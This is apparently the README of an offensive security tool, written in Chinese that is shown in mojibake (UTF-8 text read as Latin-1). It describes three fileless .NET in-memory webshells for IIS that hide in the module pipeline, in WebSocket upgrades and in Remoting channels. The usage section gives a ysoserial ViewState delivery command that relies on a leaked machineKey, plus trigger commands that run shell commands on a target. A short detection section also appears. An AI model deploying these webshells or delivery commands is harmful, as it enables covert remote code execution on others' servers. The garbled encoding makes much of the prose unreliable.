# dotnet-memshell

> **âš ï¸ ä»…ç”¨äºŽæŽˆæƒå®‰å…¨æµ‹è¯•ã€‚** Â· [English](README.md)

[![.NET Framework 4.5+](https://img.shields.io/badge/.NET%20Framework-4.5%2B-blue?style=flat-square)](https://dotnet.microsoft.com/)
[![Payload Files](https://img.shields.io/badge/Payload%20Files-1%20single%20.cs-green?style=flat-square)]()
[![License: MIT](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
[![Insertion Positions](https://img.shields.io/badge/Insertion%20Positions-3%20distinct-critical?style=flat-square)]()
[![Unmarked Traffic Impact](https://img.shields.io/badge/Unmarked%20Traffic%20Impact-0-critical?style=flat-square)]()
[![New Ports / web.config / File Drops](https://img.shields.io/badge/New%20Ports%20%C2%B7%20web.config%20%C2%B7%20File%20Drops-0-critical?style=flat-square)]()

**ä¸‰ä¸ªæ’å…¥ä½ç½®äº’ä¸ç›¸åŒçš„ .NET å†…å­˜é©¬**â€”â€”å•æ–‡ä»¶è½½è·ã€ä¸€æ¬¡ååºåˆ—åŒ–å®Œæˆæ­¦è£…ã€å¯¹æ— æ ‡è®°æµé‡å®Œå…¨ä¸å¯è§ã€‚

å…¬å¼€çš„ .NET å†…å­˜é©¬ï¼ˆmodule / handler / route / VirtualPathProviderï¼‰å‡ ä¹Žå…¨éƒ¨è½åœ¨ HTTP è¯·æ±‚ç®¡çº¿å†…çš„å·²çŸ¥ä½ç½®ä¸Šã€‚dotnet-memshell åˆ»æ„åˆ†æ•£åˆ°**ä¸‰ä¸ªä¸åŒå±‚**ï¼šç®¡çº¿äº‹ä»¶å±‚ï¼ˆå¸¦æ± å¹¿æ’­å¼ºåŒ–ï¼‰ã€**HTTPâ†’WebSocket å‡çº§ç‚¹**ï¼ˆè¿žæŽ¥æŽ¥ç®¡â€”â€”WebSocket å†…å­˜é©¬æ€æƒ³çš„ .NET ç§»æ¤ï¼‰ã€ä»¥åŠ**ä¸šåŠ¡å·²æ³¨å†Œçš„ Remoting é€šé“**ï¼ˆå®¹å™¨å¼ç«¯ç‚¹æ³¨å†Œï¼‰ã€‚ä¸‰è€…å…¨éƒ¨éª‘åœ¨ç›®æ ‡æ—¢æœ‰ç«¯ç‚¹ä¸Šï¼šä¸æ–°å¢žç«¯å£ã€ä¸æ”¹ `web.config`ã€ä¸è½åœ°æ–‡ä»¶ã€‚

> âš ï¸ **ä»…ç”¨äºŽæŽˆæƒå®‰å…¨æµ‹è¯•ã€‚** å¯¹æœªèŽ·å¾—ä¹¦é¢æŽˆæƒçš„ç³»ç»Ÿä½¿ç”¨è¿™äº›æŠ€æœ¯æ˜¯è¿æ³•è¡Œä¸ºï¼ŒåŽæžœè‡ªè´Ÿã€‚

---

## ðŸŽ¯ ä¸‰ä¸ªå†…å­˜é©¬

| # | å†…å­˜é©¬ | æ’å…¥ä½ç½® | è§¦å‘æ–¹å¼ | æœ€ä½Žæƒé™ | ä¸šåŠ¡å½±å“ |
|---|---|---|---|---|---|
| 1 | **HttpModuleShell** | `HttpApplication` æ¨¡å—äº‹ä»¶ç®¡çº¿ | ä»»æ„è¯·æ±‚å¸¦ `MSH-Cmd: <å‘½ä»¤>` å¤´ | w3wp é»˜è®¤åº”ç”¨æ± èº«ä»½ | æ— æ ‡è®°è¯·æ±‚é›¶æ‰°åŠ¨ |
| 2 | **WsTakeoverShell** | HTTPâ†’WebSocket å‡çº§ç‚¹ï¼ˆè¿žæŽ¥æŽ¥ç®¡ï¼‰ | æ¡æ‰‹å­åè®®å« `msh` | åŒä¸Š + é›†æˆç®¡çº¿ + WS ç‰¹æ€§ | éžæ¡æ‰‹è¯·æ±‚ä¸¥æ ¼ no-op |
| 3 | **RemotingUriShell** | æ—¢æœ‰ Remoting é€šé“çš„ AppDomain å…¨å±€ URI è¡¨ | remoting è°ƒç”¨ `<é€šé“>/msh` | åŒä¸Š + ä¸šåŠ¡è·‘ Remoting | ä¸šåŠ¡ URI å¹¶å­˜äº’ä¸å½±å“ |

```
HTTP.sys / IIS
 â””â”€ ASP.NET è¯·æ±‚ç®¡çº¿
     â”œâ”€ æ¨¡å—äº‹ä»¶ï¼ˆBeginRequestâ€¦ï¼‰        â† #1 HttpModuleShell
     â”œâ”€ è·¯ç”± / VPP / handler / endpoint  ï¼ˆå·²çŸ¥ä½ç½®å®¶æ—ï¼Œæœ¬é¡¹ç›®ä¸æ¶‰åŠï¼‰
     â””â”€ å‡çº§ç‚¹ï¼ˆHTTPâ†’WS æ¡æ‰‹ï¼‰           â† #2 WsTakeoverShell

è¿›ç¨‹å†…å…¶ä»–åè®®æ ˆ
 â””â”€ ä¸šåŠ¡æ—¢æœ‰ Remoting æœåŠ¡ç«¯é€šé“          â† #3 RemotingUriShell
```

## âš¡ å·®å¼‚ç‚¹ï¼ˆå…¨éƒ¨å®žæµ‹ï¼‰

| å±žæ€§ | dotnet-memshell |
|---|---|
| æ–°å¢žç›‘å¬ç«¯å£ | âœ… æ— â€”â€”#1/#2 éª‘ç«™ç‚¹ 80/443ï¼Œ#3 éª‘ä¸šåŠ¡é€šé“ |
| `web.config` / æ³¨å†Œè¡¨ / URLACL æ”¹åŠ¨ | âœ… æ— ï¼ˆå¯¹æ¯”ï¼šHttpListener åž‹å†…å­˜é©¬è¦ `netsh urlacl`ï¼Œå±žç®¡ç†å‘˜åŠ¨ä½œï¼‰ |
| æ–‡ä»¶è½åœ° | âœ… æ— â€”â€”è½½è·ä¸ºå• `.cs`ï¼Œç¼–è¯‘è¿›ååºåˆ—åŒ–å†…å®¹ï¼Œç¨‹åºé›†å­—èŠ‚åŠ è½½ï¼ˆ`Location` ä¸ºç©ºï¼‰ |
| å¯¹æ— æ ‡è®°æµé‡çš„å½±å“ | âœ… æ— â€”â€”æ¯ä¸ªè§¦å‘ç‚¹å…ˆæŸ¥é­”æ ‡è®°ï¼Œä¸å‘½ä¸­ç«‹å³è¿”å›ž |
| æ± è¦†ç›– | âœ… `HttpApplicationFactory._freeList` æ± å¹¿æ’­â€”â€”åªæ­¦è£…å½“å‰å®žä¾‹ä¼šæ¼æŽ‰å¤§éƒ¨åˆ†åŽç»­è¯·æ±‚ï¼ˆå®žæµ‹ï¼‰ |
| ä¼˜é›…é™çº§ | âœ… #2 åœ¨éžé›†æˆç®¡çº¿ä¸‹æ•èŽ·å¼‚å¸¸ç…§å¸¸æ”¾è¡Œï¼ˆå®žæµ‹ï¼šæ¡æ‰‹è¯·æ±‚ä»è¿”å›ž 200ï¼‰ |

## ðŸ§­ è°ƒç”¨é“¾

**#1 HttpModuleShell**
```
æŠ•é€’ååºåˆ—åŒ– â†’ E()
 â”œâ”€ HttpContext.Current.ApplicationInstance                 â† å½“å‰å¤„ç†è¯·æ±‚çš„å®žä¾‹
 â””â”€ HttpApplicationFactory._theApplicationFactory._freeList â† æ± å†…å…¶ä½™å®žä¾‹ï¼ˆæ± å¹¿æ’­ï¼‰
      æ¯ä¸ªå®žä¾‹äºŒé€‰ä¸€ï¼š
      â”œâ”€ é›†æˆç®¡çº¿: GetModuleContainer(<module>)
      â”‚     â†’ new SyncEventExecutionStep(app, OnRequest)      [åå°„æž„é€ åµŒå¥—ç§æœ‰ç±»åž‹]
      â”‚     â†’ ModuleContainer.AddEvent(BeginRequest, false, step)
      â””â”€ ç»å…¸ç®¡çº¿ : ApplicationStepManager._execSteps æœ«å°¾è¿½åŠ  [åªèƒ½è¿½åŠ â€”â€”æ’åˆ°æ¸¸æ ‡
                                                                    ä¹‹å‰ä¼šé‡æ‰§è¡Œå½“å‰æ­¥]
è§¦å‘: è¯·æ±‚ â†’ BeginRequest â†’ æ³¨å…¥çš„ step â†’ OnRequest
      â”œâ”€ æ—  MSH-Cmd å¤´ â†’ returnï¼ˆä¸šåŠ¡è¯·æ±‚åŽŸæ ·èµ°å®Œå…¨ç¨‹ï¼‰
      â””â”€ æœ‰å¤´ â†’ cmd.exe /c <å‘½ä»¤> â†’ Response.Write(è¾“å‡º) â†’ End
```

**#2 WsTakeoverShell**
```
åŒä¸€é”šç‚¹ï¼›å¤„ç†å‡½æ•°å¯¹éžæ¡æ‰‹è¯·æ±‚ä¸¥æ ¼ no-op
GET + Upgrade: websocket + Sec-WebSocket-Protocol: msh
 â†’ IsWebSocketRequest æ ¡éªŒ â†’ AcceptWebSocketRequest(Duplex)
 â†’ è¿žæŽ¥å‡çº§ï¼Œè¯·æ±‚ç®¡çº¿åˆ°æ­¤ç»ˆæ­¢ï¼Œå…¨åŒå·¥æµç”±å¾ªçŽ¯ç‹¬å 
 â†’ Receive(å‘½ä»¤) â†’ exec â†’ Send(è¾“å‡º) â€¦ ç›´è‡³ Close å¸§
```

**#3 RemotingUriShell**
```
E()
 â”œâ”€ AppDomain.AssemblyResolve â† æ¡¥æŽ¥å­—èŠ‚åŠ è½½çš„ç¨‹åºé›†ï¼ˆformatter æŒ‰ç¨‹åºé›†åè§£æž
 â”‚                               well-known ç±»åž‹ï¼Œå¿…é¡»æ¡¥å›žå·²åŠ è½½å®žä¾‹ï¼‰
 â”œâ”€ å®ˆå«: å·²å­˜åœ¨ IChannelReceiverï¼ˆä¸šåŠ¡è‡ªæ‰˜ç®¡ remoting æ‰ç»§ç»­ï¼‰
 â””â”€ RegisterWellKnownServiceType(E.Svc, "msh", Singleton)
è§¦å‘: remoting å®¢æˆ·ç«¯ â†’ tcp://host:<ä¸šåŠ¡ç«¯å£>/msh â†’ Svc.Exec(cmd)
```

## âœ… å®žæµ‹éªŒè¯ï¼ˆWindows 11 + IIS 10 é›†æˆç®¡çº¿ï¼ŒçœŸæœºï¼‰

| é¡¹ | ç»“æžœ | è¯æ® |
|---|---|---|
| **#1 HttpModuleShell** | âœ… | `MSH-Cmd: __verify__` â†’ `armed; integrated=True; pid=...`ï¼›`MSH-Cmd: whoami` â†’ `iis apppool\defaultapppool`ï¼›æ— æ ‡è®°è¯·æ±‚ 200 |
| **#2 WsTakeoverShell** | âœ… | å­åè®® `msh` æ¡æ‰‹ â†’ 101 åŽå…¨åŒå·¥ï¼š`whoami`â†’`iis apppool\defaultapppool`ã€`hostname`â†’`your-host`ã€æ­£å¸¸ Close |
| **#3 RemotingUriShell** | âœ… | ä¸šåŠ¡ `calc(7,8)=15` ä¸Ž shell `/msh whoami` **åŒç«¯å£åŒé€šé“å¹¶å­˜**ï¼›ä¸šåŠ¡å†è°ƒ `calc(100,1)=101` |
| æ— æ ‡è®°æµé‡éš”ç¦» | âœ… | æ™®é€šè¯·æ±‚ 200ï¼›æ— å…³è¯·æ±‚å¤´è¢«å¿½ç•¥ï¼›ä¸šåŠ¡ WSï¼ˆæ—  msh å­åè®®ï¼‰ä¸è¢«åŠ«æŒ |

### é›†æˆç®¡çº¿ä¸¤æ¡å…³é”®å®žæµ‹ç»“è®º

1. **é€šçŸ¥é€‰æ‹©**ï¼šå‘æ¨¡å—å®¹å™¨ `AddEvent` æ—¶ï¼Œåªæœ‰ **`RequestNotification.AcquireRequestState`** ä¼šè§¦å‘ï¼›åœ¨åŒä¸€å®¹å™¨ä¸ŠæŒ‚ `BeginRequest` / `LogRequest` / `UpdateRequestCache` å®žæµ‹**ä¸è¢«æ´¾å‘**ï¼ˆ`probe_hits` è®¡æ•°ä¸º 0ï¼‰ã€‚è½½è·é»˜è®¤æŒ‚ `AcquireRequestState`ã€‚
2. **WebSocket æŽ¥ç®¡å¿…é¡»æŠ‘åˆ¶é¡µé¢è¾“å‡º**ï¼š`AcceptWebSocketRequest` ä¹‹åŽç®¡çº¿ä»ä¼šæ‰§è¡Œé¡µé¢ handlerï¼Œå¿…é¡»åœ¨åŒä¸€å¤„ç†å‡½æ•°å†…ç½® `Response.SuppressContent = true` ä¸” `Response.StatusCode = 101`ï¼Œå¦åˆ™è¿žæŽ¥è¢«æ”¶å°¾ï¼ˆ`WebSocketException 0x80070040`ï¼‰ã€‚`RemapHandler` åœ¨æ­¤é˜¶æ®µä¸å¯ç”¨ï¼ˆæ¡†æž¶åªå…è®¸åœ¨ `MapRequestHandler` ä¹‹å‰è°ƒç”¨ï¼‰ã€‚
3. **Remoting å®¢æˆ·ç«¯é¡»å¼•ç”¨ä¸šåŠ¡ç¨‹åºé›†**ï¼šSAO è°ƒç”¨è¦æ±‚å®¢æˆ·ç«¯ä»£ç†ç±»åž‹åä¸ŽæœåŠ¡ç«¯ä¸€è‡´ï¼Œå®¢æˆ·ç«¯éœ€å¼•ç”¨ä¸šåŠ¡ dllï¼ˆRemoting å›ºæœ‰çº¦æŸï¼Œéžæœ¬é©¬ç¼ºé™·ï¼‰ã€‚

## ðŸ”Œ ç”¨æ³•

ç”Ÿæˆä¸ŽæŠ•é€’ï¼ˆå‰æï¼šç›®æ ‡ `machineKey` å·²çŸ¥/æ³„éœ²ï¼‰ï¼š
```bash
ysoserial.exe -p ViewState -g XamlAssemblyLoadFromFile ^
  -c "payloads\HttpModuleShell.cs;System.dll;System.Web.dll" ^
  --decryptionalg=AES --decryptionkey=<64ä½åå…­è¿›åˆ¶è§£å¯†é”®> ^
  --validationalg=HMACSHA256 --validationkey=<64ä½åå…­è¿›åˆ¶æ ¡éªŒé”®> ^
  --path=/Default.aspx --apppath=/

# äº§ç‰© POST åˆ°ç›®æ ‡ä»»æ„å¯ç”¨ ViewState çš„é¡µé¢: __VIEWSTATE=<payload>
# ï¼ˆRemotingUriShell æŠŠå¼•ç”¨æ¢æˆ System.dll;System.Runtime.Remoting.dllï¼‰
```

è§¦å‘ï¼š
```powershell
# #1
Invoke-WebRequest http://target/Default.aspx -Headers @{ 'MSH-Cmd' = 'whoami' }
# #2 â€”â€” ä»»æ„ WebSocket å®¢æˆ·ç«¯
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ws.Options.AddSubProtocol('msh')
$ws.ConnectAsync([Uri]'ws://target/Default.aspx', [Threading.CancellationToken]::None).Wait()
# #3
RemotingShellClient.exe tcp://target:<ä¸šåŠ¡ç«¯å£>/msh "whoami"
```

ä¸ä¾èµ– ysoserial çš„æœ¬åœ°æµ‹è¯•ï¼š`tools/build.ps1` + `tools/Loader.aspx`ï¼ˆå®žéªŒç”¨åŠ è½½å™¨ï¼Œåˆ‡å‹¿éƒ¨ç½²åˆ°ç”Ÿäº§ï¼‰ã€‚

## ðŸ“Œ æŠ•é€’é¢å®žæµ‹ç»“è®º

| Gadget | ååºåˆ—åŒ–æ—¶æ˜¯å¦æ‰§è¡Œ | è¯´æ˜Ž |
|---|---|---|
| `XamlAssemblyLoadFromFile` | âœ… | XAML è§£æžæœŸåŠ è½½å¹¶å®žä¾‹åŒ–â€”â€”**æœ¬é¡¹ç›®é‡‡ç”¨** |
| `ActivitySurrogateSelectorFromFile` | âŒ | å…¶ `AxHost.State` åŒ…è£…å¯¹ `PropertyBagBinary` æƒ°æ€§ï¼Œæ™®é€š ViewState æ‰“ä¸åŠ¨ |
| `TypeConfuseDelegate` | âš ï¸ | èµ° `Process.Start`ï¼ˆè¿›ç¨‹å¤–ï¼‰ï¼Œä¸ç¬¦åˆå†…å­˜é©¬å½¢æ€ |

å¦ä¸¤ä¸ªå·¥ç¨‹äº‹å®žï¼šysoserial çš„ ViewState æ’ä»¶å†…éƒ¨ `Uri.EscapeDataString` æœ‰çº¦ 32K è¾“å…¥ä¸Šé™ï¼ˆå†…åµŒå¤§ç¨‹åºé›†éœ€ gzipï¼‰ï¼›æŠ•é€’é‚£ä¸€æ¬¡ POST ä¼šè¿”å›žä¸€æ¬¡æ€§ viewstate é”™è¯¯é¡µï¼Œå…¶åŽè¯·æ±‚æ­£å¸¸ã€‚

## ðŸ” æ£€æµ‹ä¸Žé˜²å¾¡

- å„ `HttpApplication` å®žä¾‹ module container çš„æ­¥éª¤æ¸…å• / `_execSteps` é•¿åº¦ä¸Žæ¡†æž¶æž„å»ºå€¼æ¯”å¯¹
- `AppDomain.GetAssemblies()` ä¸­ `Location` ä¸ºç©ºçš„ç¨‹åºé›†ï¼ˆbyte[] åŠ è½½ï¼‰
- WS æ¡æ‰‹ä¸­çš„é™Œç”Ÿå­åè®®ï¼›è¶…å‡ºè¯·æ±‚ç®¡çº¿ç”Ÿå‘½å‘¨æœŸçš„é•¿è¿žæŽ¥
- åå°„ `RemotingConfiguration` å†…éƒ¨è¡¨ï¼Œå‘çŽ°éžä¸šåŠ¡å£°æ˜Žçš„ well-known URI
- machineKey è§†åŒé«˜å±å‡­æ®ç®¡ç†ï¼ˆæ³„éœ² = ViewState ååºåˆ—åŒ– RCE é¢ï¼‰ï¼›ç›‘æŽ§ worker è¿›ç¨‹æ´¾ç”Ÿ `cmd.exe`

## ðŸ“œ è®¸å¯ä¸Žå¼•ç”¨

MITâ€”â€”è§ [LICENSE](LICENSE)ã€‚

- [veo/wsMemShell](https://github.com/veo/wsMemShell)â€”â€”WebSocket å†…å­˜é©¬æ€æƒ³æ¥æºï¼ˆJava ä¾§ï¼‰
- [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net)â€”â€”æŠ•é€’è½½è·ç”Ÿæˆ
- HttpModule æ³¨å…¥æ‰‹æ³•æºè‡ª 2023 å¹´ä¸­æ–‡å®‰å…¨ç¤¾åŒºå…¬å¼€ç ”ç©¶ï¼›æœ¬ä»“åº“å¢žåŠ äº† HttpApplication æ± å¹¿æ’­ä¸Žç»å…¸ç®¡çº¿å›žé€€ã€‚

